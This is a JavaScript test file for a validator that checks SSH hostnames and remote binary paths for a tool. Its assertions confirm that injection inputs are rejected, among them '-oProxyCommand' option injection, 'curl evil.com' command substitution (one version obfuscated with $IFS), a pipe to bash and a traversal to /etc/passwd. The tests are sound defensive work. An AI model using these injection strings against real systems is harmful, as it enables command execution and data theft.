const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { HOSTNAME_RE, BINPATH_RE, validateRemoteSettings } = require("../validation");

describe("HOSTNAME_RE", () => {
  it("accepts valid corp hostnames", () => {
    assert.ok(HOSTNAME_RE.test("myhost.corp.amazon.com"));
    assert.ok(HOSTNAME_RE.test("dev-dsk-user-2b-abc123.us-west-2.amazon.com"));
    assert.ok(HOSTNAME_RE.test("cm-armdev.corp.amazon.com"));
  });

  it("rejects single-character hostnames", () => {
    assert.ok(!HOSTNAME_RE.test("a"));
    assert.ok(!HOSTNAME_RE.test("1"));
  });

  it("rejects hostnames starting with dash", () => {
    assert.ok(!HOSTNAME_RE.test("-evil.com"));
    assert.ok(!HOSTNAME_RE.test("-oProxyCommand=bad"));
  });

  it("rejects hostnames with special characters", () => {
    assert.ok(!HOSTNAME_RE.test("host;evil.com"));
    assert.ok(!HOSTNAME_RE.test("host$(cmd).com"));
    assert.ok(!HOSTNAME_RE.test("host`cmd`.com"));
    assert.ok(!HOSTNAME_RE.test("host|pipe.com"));
  });

  it("rejects consecutive dots", () => {
    assert.ok(!HOSTNAME_RE.test("a..b"));
    assert.ok(!HOSTNAME_RE.test("host..corp.amazon.com"));
  });

  it("rejects labels starting or ending with hyphens", () => {
    assert.ok(!HOSTNAME_RE.test("-host.amazon.com"));
    assert.ok(!HOSTNAME_RE.test("host-.amazon.com"));
    assert.ok(!HOSTNAME_RE.test("host.amazon-.com"));
  });

  it("rejects hostnames without a dot (requires FQDN)", () => {
    assert.ok(!HOSTNAME_RE.test("localhost"));
    assert.ok(!HOSTNAME_RE.test("ab"));
  });

  it("accepts shortest valid FQDN (a.b)", () => {
    assert.ok(HOSTNAME_RE.test("a.b"));
  });
});

describe("BINPATH_RE", () => {
  it("accepts valid binary paths", () => {
    assert.ok(BINPATH_RE.test("~/.local/bin/kiroclaw"));
    assert.ok(BINPATH_RE.test("/usr/local/bin/kiroclaw"));
    assert.ok(BINPATH_RE.test("kiroclaw"));
    assert.ok(BINPATH_RE.test("$HOME/.local/bin/kiroclaw"));
  });

  it("rejects paths starting with dash", () => {
    assert.ok(!BINPATH_RE.test("-o"));
    assert.ok(!BINPATH_RE.test("-oProxyCommand=evil"));
  });

  it("rejects paths with spaces", () => {
    assert.ok(!BINPATH_RE.test("/opt/my tools/kiroclaw"));
    assert.ok(!BINPATH_RE.test("kiroclaw token"));
  });

  it("accepts paths with single dots (current dir)", () => {
    assert.ok(BINPATH_RE.test("./bin/kiroclaw"));
    assert.ok(BINPATH_RE.test("/usr/./bin/kiroclaw"));
  });

  it("rejects paths with shell metacharacters", () => {
    assert.ok(!BINPATH_RE.test("x;curl evil.com"));
    assert.ok(!BINPATH_RE.test("$(curl evil.com)"));
    assert.ok(!BINPATH_RE.test("x|bash"));
    assert.ok(!BINPATH_RE.test("x`id`"));
    assert.ok(!BINPATH_RE.test("curl$IFS-o$IFS/tmp/x$IFShttp//evil.com"));
    assert.ok(!BINPATH_RE.test("$IFS"));
    assert.ok(!BINPATH_RE.test("$PATH"));
    assert.ok(!BINPATH_RE.test("$HOMEevil"));
  });
});

describe("validateRemoteSettings", () => {
  it("returns null for valid settings", () => {
    assert.equal(validateRemoteSettings("myhost.corp.amazon.com", "~/.local/bin/kiroclaw"), null);
    assert.equal(validateRemoteSettings("myhost.corp.amazon.com", "$HOME/.local/bin/kiroclaw"), null);
  });

  it("returns null for empty host (skips remote)", () => {
    assert.equal(validateRemoteSettings("", "~/.local/bin/kiroclaw"), null);
  });

  it("returns null for empty bin (uses default)", () => {
    assert.equal(validateRemoteSettings("myhost.corp.amazon.com", ""), null);
  });

  it("rejects hostname without dot", () => {
    const err = validateRemoteSettings("localhost", "/usr/bin/kiroclaw");
    assert.ok(err);
    assert.ok(err.includes("hostname"));
  });

  it("rejects hostname with SSH option injection", () => {
    const err = validateRemoteSettings("-oProxyCommand=evil", "/usr/bin/kiroclaw");
    assert.ok(err);
  });

  it("rejects bin path starting with dash", () => {
    const err = validateRemoteSettings("host.example.com", "-oProxyCommand=evil");
    assert.ok(err);
    assert.ok(err.includes("dash"));
  });

  it("rejects bin path with shell metacharacters", () => {
    const err = validateRemoteSettings("host.example.com", "x;curl evil.com");
    assert.ok(err);
  });

  it("rejects bin path with spaces", () => {
    const err = validateRemoteSettings("host.example.com", "/opt/my tools/kiroclaw");
    assert.ok(err);
  });

  it("rejects bin path with path traversal", () => {
    assert.ok(validateRemoteSettings("host.example.com", "../../bin/evil"));
    assert.ok(validateRemoteSettings("host.example.com", "~/../../../etc/passwd"));
  });

  it("rejects hostname with consecutive dots", () => {
    assert.ok(validateRemoteSettings("a..b", "/usr/bin/kiroclaw"));
  });

  it("rejects hostname over 253 chars", () => {
    const long = "a" + ".bb".repeat(84) + ".c";  // > 253 chars
    assert.ok(validateRemoteSettings(long, "/usr/bin/kiroclaw"));
  });
});
